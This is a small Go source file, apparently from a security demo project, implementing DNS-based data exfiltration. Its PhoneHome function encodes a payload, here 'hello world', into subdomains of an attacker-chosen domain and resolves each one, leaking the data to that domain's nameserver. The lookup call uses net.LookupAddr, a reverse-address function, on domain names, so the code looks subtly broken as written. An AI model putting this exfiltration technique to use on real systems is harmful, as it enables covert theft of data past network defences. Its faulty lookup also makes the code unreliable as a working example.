package dnsexfiltool

import (
	"log"
	"net"

	"github.com/sam-bee/security-itsalwaysdns/pkg/codec"
)

func PhoneHome (mainDomain string) {

	exfilPayload := "hello world"

	domainsToQuery := domainsToQuery(exfilPayload, mainDomain)

	// Send DNS queries to the domainsToQuery
	for _, domain := range domainsToQuery {
		ip, err := net.LookupAddr(domain)
		if err != nil {
			log.Printf("Error looking up domain %s: %s", domain, err)
		}
		log.Printf("Domain %s resolved to %s", domain, ip)
	}
}

func domainsToQuery(exfilPayload string, mainDomain string) []string {
	return codec.GetDomainsToLookUp(exfilPayload, mainDomain)
}
